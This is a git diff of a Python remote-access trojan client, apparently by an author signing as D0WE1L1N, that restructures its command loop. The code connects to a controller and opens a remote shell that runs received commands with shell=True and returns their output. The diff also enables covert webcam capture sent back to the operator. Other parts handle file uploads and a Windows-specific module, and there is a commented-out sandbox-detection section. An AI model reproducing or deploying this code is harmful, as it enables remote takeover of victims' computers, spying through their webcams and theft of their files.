@@ -4,20 +4,14 @@
 # @Author    :D0WE1L1N
 import os
 import socket
-from subprocess import Popen, PIPE
 import sys
-import shutil
 # import wmi
 # from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
 # import random
 # import time
 # import win32api
 import threading
-import tempfile
-import win32file
-# from cv2 import VideoCapture, imwrite
 # import win32api
-import win32con
 import inspect
 import ctypes
 def _async_raise(tid, exctype):
@@ -61,13 +55,55 @@ def PINGPONG_client_T(ip, port):
             sys.exit(1)
         while True:
             data = s.recv(1024)
-            if data.decode() == "CMDSHELL_APP":
+            # usage 
+            if data.decode() == 'SHOW_ALL_USAGE_APP':
+                pass
+            elif data.decode() == "EXIT_APP":
+                s.close()
+                break
+            elif data.decode() == "CHECK_APP":
+                s.send(bytes("OK", "utf8"))
+#cmd_START_location
+            elif data.decode() == "CMDSHELL_APP":
+                def CMD_client(ip, port, main_port):
+                    from subprocess import Popen, PIPE
+                    try:
+                        try:
+                            cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            cmd_c.connect((ip, port))
+                        except socket.error:
+                            sys.exit(1)
+                        while True:
+                            cmd_command = cmd_c.recv(1024)
+                            if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
+                                main_port = cmd_c.recv(1024).decode("utf8")
+                                PINGPONG_client(ip, int(main_port))
+                                break
+                            elif cmd_command.decode("utf8") == "PING":
+                                cmd_c.send(bytes("PONG", "utf8"))
+                            else:
+                                cmd = Popen(cmd_command.decode(
+                                    "utf8"), shell=True, stdout=PIPE, stderr=PIPE)
+                                cmd_print_out = cmd.stdout.read()
+                                if not cmd_print_out:
+                                    cmd_print_out = cmd.stderr.read()
+                                if not cmd_print_out:
+                                    cmd_print_out = b'OK'
+                                cmd_c.send(cmd_print_out)
+                        cmd_c.close()
+                    except:
+                        sys.exit(1)
                 s.send(bytes("OK", 'utf8'))
                 cmd_port = int(s.recv(1024).decode(encoding="utf8"))
                 s.close()
                 CMD_client(ip, cmd_port, port)
                 break
+#cmd_END_location
+#priv_vbp_listen_START_location
             elif data.decode() == "PRO_VBP_APP":
+                import tempfile
+                import win32file
+                import win32con
                 def moni_t():
                     s.send(bytes("OK", 'utf8'))
                     PINGPONG = os.path.realpath(sys.executable)
@@ -154,32 +190,34 @@ def PINGPONG_client_T(ip, port):
                     if e_data.decode() == "EXIT":
                         stop_thread(t_m)
                         break
-            # if data.decode() == "CAM_SHOT_APP":
-            #     os.mkdir("./temp")
-            #     s.send(bytes("OK", 'utf8'))
-            #     cap = VideoCapture(0)
-            #     while True:
-            #         f, frame = cap.read()
-            #         imwrite("./temp/image.jpg", frame)
-            #         cap.release()
-            #         break
-            #     with open("./temp/image.jpg", "rb") as f:
-            #         img_data = f.read()
-            #     len_data = len(img_data)
-            #     s.send(bytes(str(len_data), 'utf8'))
-            #     check = s.recv(1024)
-            #     if check:
-            #         s.sendall(img_data)
-            #     re_check = s.recv(1024)
-            #     shutil.rmtree("./temp")
-            #     if re_check:
-            #         continue
-            elif data.decode() == "EXIT_APP":
-                s.close()
-                break
-            elif data.decode() == "CHECK_APP":
-                s.send(bytes("OK", "utf8"))
+#priv_vbp_listen_END_location
+#cam_shot_START_location
+            if data.decode() == "CAM_SHOT_APP":
+                from cv2 import VideoCapture, imwrite
+                import shutil
+                os.mkdir("./temp")
+                s.send(bytes("OK", 'utf8'))
+                cap = VideoCapture(0)
+                while True:
+                    f, frame = cap.read()
+                    imwrite("./temp/image.jpg", frame)
+                    cap.release()
+                    break
+                with open("./temp/image.jpg", "rb") as f:
+                    img_data = f.read()
+                len_data = len(img_data)
+                s.send(bytes(str(len_data), 'utf8'))
+                check = s.recv(1024)
+                if check:
+                    s.sendall(img_data)
+                re_check = s.recv(1024)
+                shutil.rmtree("./temp")
+                if re_check:
+                    continue
+#cam_shot_END_location
+#upload_START_location
             elif data.decode() == "UPLOAD_APP":
+                import shutil
                 is_named = False
                 s.send(bytes("OK", 'utf8'))
                 dir_data = s.recv(1024).decode()
@@ -213,38 +251,13 @@ def PINGPONG_client_T(ip, port):
                         break
             if data == "exit":
                 break
+#upload_END_location
+#exit_START_location
         s.close()
     except:
         sys.exit(1)
+#exit_END_location
 
-
-def CMD_client(ip, port, main_port):
-    try:
-        try:
-            cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            cmd_c.connect((ip, port))
-        except socket.error:
-            sys.exit(1)
-        while True:
-            cmd_command = cmd_c.recv(1024)
-            if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
-                main_port = cmd_c.recv(1024).decode("utf8")
-                PINGPONG_client(ip, int(main_port))
-                break
-            elif cmd_command.decode("utf8") == "PING":
-                cmd_c.send(bytes("PONG", "utf8"))
-            else:
-                cmd = Popen(cmd_command.decode(
-                    "utf8"), shell=True, stdout=PIPE, stderr=PIPE)
-                cmd_print_out = cmd.stdout.read()
-                if not cmd_print_out:
-                    cmd_print_out = cmd.stderr.read()
-                if not cmd_print_out:
-                    cmd_print_out = b'OK'
-                cmd_c.send(cmd_print_out)
-        cmd_c.close()
-    except:
-        sys.exit(1)
 # 沙箱检测
 # class LASTINPUTINFO(Structure):
 #     _fields_ = [
